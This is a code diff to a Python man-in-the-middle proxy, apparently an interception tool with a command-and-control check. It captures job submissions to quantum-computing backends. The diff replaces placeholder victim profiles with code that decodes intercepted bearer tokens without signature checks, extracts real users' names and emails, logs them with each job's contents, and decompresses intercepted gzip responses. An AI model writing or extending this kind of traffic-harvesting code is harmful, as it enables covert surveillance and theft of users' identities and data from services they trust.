@@ -264,19 +264,6 @@ class TrafficCapture:
         self.pending_jobs: Dict[Any, dict] = {}
         self._test_c2_connection()
 
-        self.user_profiles = {
-            0: {
-                "username": "Singapore Quantum Research Academy",
-                "email": "cloud@qra.com.sg",
-                "ip": "29.35.87.150",
-            },
-            1: {
-                "username": "Quantum CyberSecurity Group of Singapore",
-                "email": "quantum@cybersec.com.sg",
-                "ip": "58.25.99.200",
-            },
-        }
-
     def _fetch_public_ip(self) -> str:
         services = [
             "https://api.ipify.org?format=json",
@@ -387,7 +374,7 @@ class TrafficCapture:
             if not auth:
                 raise ValueError("Header doesn't have Authorization attribute")
             token = auth.split(" ", 1)[1].strip()
-            jwt.decode(
+            payload = jwt.decode(
                 token,
                 options={
                     "verify_signature": False,
@@ -396,8 +383,9 @@ class TrafficCapture:
                     "verify_iss": False,
                 },
             )
-            index = self._get_current_index()
-            profile = self.user_profiles[index]
+
+            username = payload.get("name") or "unknown"
+            email = payload.get("email") or "unknown"
             parsed = json.loads(body)
             backend = parsed.get("backend", "unknown")
             shots = parsed.get("shots", "unknown")
@@ -409,14 +397,14 @@ class TrafficCapture:
             key = id(body)
             self.pending_jobs[key] = {
                 "timestamp": dt.datetime.now().isoformat(),
-                "client_ip": profile["ip"],
+                "client_ip": self.public_ip,
                 "url": url,
                 "method": method,
                 "backend": backend,
                 "shots": shots,
                 "raw_body": parsed,
-                "username": profile["username"],
-                "email": profile["email"],
+                "username": username,
+                "email": email,
             }
             return key
         except Exception as e:
@@ -429,7 +417,7 @@ class TrafficCapture:
                 print("   No pending job data found for this response")
                 return
             job_data = self.pending_jobs[key]
-            response = json.loads(response_body)
+            response = json.loads(gzip.decompress(response_body))
             job_id = None
             if isinstance(response, dict):
                 job_id = (
@@ -754,12 +742,18 @@ class ProxyHandler(BaseHTTPRequestHandler):
             payload = response.read()
 
             if target:
+                encoding = response.headers.get("Content-Encoding", "").lower()
+                readable_payload = payload
+
+                if encoding == "gzip":
+                    readable_payload = gzip.decompress(payload)
+
                 log_message(
                     "RESPONSE",
                     display_url,
                     f"HTTP/1.1 {response.status} {response.reason}",
                     response.headers,
-                    payload,
+                    readable_payload,
                 )
                 capture.on_response(
                     key=capture_key,
